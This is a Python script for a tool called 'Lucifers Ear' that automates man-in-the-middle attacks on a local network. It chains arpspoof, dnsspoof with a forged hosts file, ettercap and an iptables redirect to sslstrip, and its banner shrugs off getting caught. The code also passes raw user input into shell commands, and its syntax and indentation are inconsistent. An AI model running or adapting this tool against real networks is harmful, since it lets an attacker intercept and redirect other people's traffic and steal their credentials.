#!/usr/bin/python3

#LE - Lucifers Ear

import subprocess
import datetime
from termcolor import colored

class attack:
	def mitmarpcp(self):
		try:
			subprocess.call('clear', shell=True)
			print colored("MitM with ARP Cache Poisoning", 'green')
			print colored('MitMARPCP Processing ...', 'red')
			print
			subprocess.call('echo 1 > /proc/sys/net/ipv4/ip_forward', shell=True)
			print colored('Value in \'/proc/sys/net/ipv4/ip_forward\':', 'red')
			subprocess.call('cat /proc/sys/net/ipv4/ip_forward', shell=True)
			print

			print colored('Give network interface you use: ', 'red')
			netinter = raw_input()
			print
			print colored('Give IP address of target: ', 'red')
			iptarget = raw_input()
			print
			print colored('Give false IP under you hiding:', 'red')
			falseip = raw_input()
			print
			com = 'arpspoof -i ' + netinter + ' -t ' + iptarget + ' ' + falseip
			maincom = 'xterm -hold -e ' + '\'' + com + '\' &'
			subprocess.call(maincom, shell=True)
			print
			print
		except OSError:
			print colored('Something went wrong!!! Propably you give wrong interface or IP address of target!!!', 'cyan')
			print
			print

	def mitmarpsec(self, netinter, iptarget, falseip):
		try:
			subprocess.call('clear', shell=True)
			print colored("MitM with ARP Cache Poisoning", 'green')
                        print colored('MitMARPCP Processing ...', 'red')
                        print
                        subprocess.call('echo 1 > /proc/sys/net/ipv4/ip_forward', shell=True)
                        print colored('Value in \'/proc/sys/net/ipv4/ip_forward\':', 'red')
                        subprocess.call('cat /proc/sys/net/ipv4/ip_forward', shell=True)
                        print
                        print
                        com = 'arpspoof -i ' + netinter + ' -t ' + iptarget + ' ' + falseip
                        maincom = 'xterm -hold -e ' + '\'' + com + '\' &'
                        subprocess.call(maincom, shell=True)
			print
			print
		except OSError:
			print colored('Something went wrong!!! Propably you give wrong interface or IP address of target!!!', 'cyan')
                        print
                        print

	def mitmdcp(self):
		try:
			subprocess.call('clear', shell=True)
			print colored("MitM with DNS Cache Poisoning", 'green')
			print colored('MitMDCP Processing ...', 'red')
			print
			print

			print colored('Give IP address of your target: ', 'red')
			iptarget2 = raw_input()
			com = 'nslookup ' + iptarget2
			maincom='xterm -hold -e ' + '\'' + com + '\' &'
			subprocess.call(maincom, shell=True)
			print colored('Running Apache Service ...', 'red')
			print colored('Apache Service Processing ...', 'red')
			subprocess.call('service apache2 start', shell=True)
			print
			print

			print colored('Now define file with information about', 'red')
			print colored('which DNS records we want to falsified', 'red')
			print colored('and where they should be redirect', 'red')
			print

			subprocess.call('touch hosts.txt', shell=True)
			print colored('Give interface you use:', 'red')
			interface = raw_input()
			print colored('Host you attack: ', 'red')
			host = raw_input()
			print colored('False IP: ', 'red')
			false_ip = raw_input()
			megacom='ifconfig ' + interface + ' | grep -w inet | awk \'{print $2}\' > hosts.txt'
			subprocess.call(megacom, shell=True)
			coms='echo ' + host + ' >> hosts.txt'
			subprocess.call(coms, shell=True)
			print
			print colored('Example of looking a hosts.txt file: <Attacker IP> <www.example.com>', 'yellow')
			print
			print

			print colored('ARP Cache Poisoning running:', 'red')
			attack().mitmarpsec(interface, iptarget2, false_ip)
			print colored('ARP Spoofing Processing ...', 'red')
			com4 = 'dnsspoof -i ' + interface + ' -f hosts.txt'
			commain = 'xterm -hold -e ' + '\'' + com4 + '\' &'
			subprocess.call(commain, shell=True)
			com5 = 'nslookup ' + host + ' &'
			commainsec='xterm -hold -e ' + '\'' + com5 + '\' &'
			subprocess.call(commainsec, shell=True)
			print
			print
		except OSError:
			print colored('Something went wrong!!! Propably you give wrong interface or IP address of target!!!', 'cyan')
			print
			print

	def mitmssl(self):
		try:
			subprocess.call('clear', shell=True)
			print colored("MitM with SSL", 'green')
			print colored('MitM with SSL Processing ...', 'red')
			print
			print

			print colored('Give name of network interface you use: ', 'red')
			interface = raw_input()
			print colored('Give your address IP: ', 'red')
			ourip = raw_input()
			print colored('Give address IP of the target: ', 'red')
			targetip = raw_input()
			print colored('Give false IP address: ', 'red')
			falseip=raw_input()
			print colored('ARP Cache Poisoning running:', 'red')
                        attack().mitmarpsec(interface, targetip, falseip)
                        print colored('ARP Spoofing Poisoning Processing ...', 'red')
                        print
                        print

			com = 'ettercap -Ti ' + interface + ' -M arp:/remote/' + ourip + '/' + targetip
			maincom = 'xterm -hold -e ' + '\'' + com + '\' &'
			subprocess.call(maincom, shell=True)
		except IOError:
			print colored('Something went wrong!!! Propably you give wrong interface or IP address of target!!!', 'cyan')
                        print
                        print

	def mitmss(self):
		try:
			subprocess.call('clear', shell=True)
			print colored("MitM with SSL Stripping", 'green')
			print colored("MitM with SSL Stripping Processing ...", 'green')
			print
			print
			print colored("MitM with SSL Processing ...", 'green')
			attack().mitmssl()
			print
			print
			print colored('IPTABLES Processing ...', 'red')
			com = 'iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080'
			subprocess.call(com, shell=True)
			print colored('sslstrip Processing ...', 'red')
			com1 = 'sslstrip -l 8080'
			com1main = 'xterm -hold -e ' + '\'' + com1 + '\' &'
			subprocess.call(com1main, shell=True)
			print
			print
		except IOError:
			print colored('Something went wrong!!! Propably you give wrong interface or IP address of target!!!', 'cyan')
			print
			print

	def exit(self):
		print colored("Exit", 'green')
		print
		print

	def error(self):
		print colored("Error!!! Bad choice", 'green')
		print
		print

class options:
	def first(self):
		subprocess.call('clear', shell=True)
		options().logo()
		options().welcome()
		print colored("Choose 1 for: MitM with ARP Cache Poisoning\n", 'green')
                print colored("Choose 2 for: MitM with DNS Cache Poisoning\n", 'green')
                print colored("Choose 3 for: MitM with SSL\n", 'green')
                print colored("Choose 4 for: MitM with SSL Stripping\n", 'green')
                print colored("Choose 5 for: Exit", 'green')

		while(1):
			choice = raw_input()
			subprocess.call('clear', shell=True)
			myobj = attack()

			if (choice == '1'):
			        myobj.mitmarpcp()
			if (choice == '2'):
		        	myobj.mitmdcp()
			if (choice == '3'):
			        myobj.mitmssl()
			if (choice == '4'):
			        myobj.mitmss()
			if (choice == '5'):
			        myobj.exit()
				break
			if (choice != '1' and choice != '2' and choice != '3' and choice != '4' and choice != '5' and choice != '6'):
			        myobj.error()

			print colored("Choose 1 for: MitM with ARP Cache Poisoning\n", 'green')
                        print colored("Choose 2 for: MitM with DNS Cache Poisoning\n", 'green')
                        print colored("Choose 3 for: MitM with SSL\n", 'green')
                        print colored("Choose 4 for: MitM with SSL Stripping\n", 'green')
                        print colored("Choose 5 for: Exit", 'green')

	def welcome(self):
		print colored("\t\t\t\t\t\t\tWelcome at Lucifers Ear", 'red')
		print colored("\t\t\t\t\t\t\tDo what you want.", 'blue')
		print colored("\t\t\t\t\t\tI\'m not your mother to say you", 'red')
		print colored("\t\t\t\t\t\t\twhat you should do!", 'blue')
		print colored("\t\t\t\t\t\t\tSo if you get caught", 'red')
		print colored("\t\t\t\t\t\t\tIt\'s not my problem!", 'blue')
		print
		print
		print colored("\t\t\t\t\t\tRemember your sin will be weighted.", 'red')
		print colored("\t\t\t\t\t\t\tBecause I hear everything.", 'blue')
		print
		print

	def logo(self):
		print colored('\t\t\t\t\t\t\t__	 ______', 'red')
		print colored('\t\t\t\t\t\t\t| |	 | ____|', 'red')
		print colored('\t\t\t\t\t\t\t| |	 | |', 'red')
		print colored('\t\t\t\t\t\t\t| |	 | |___', 'red')
		print colored('\t\t\t\t\t\t\t| |	 | ____|', 'red')
		print colored('\t\t\t\t\t\t\t| |	 | |', 'red')
		print colored('\t\t\t\t\t\t\t| |_____ | |____', 'red')
		print colored('\t\t\t\t\t\t\t|_______||_____|', 'red')
		print
		print

#main
if __name__ == '__main__':
	options().first()
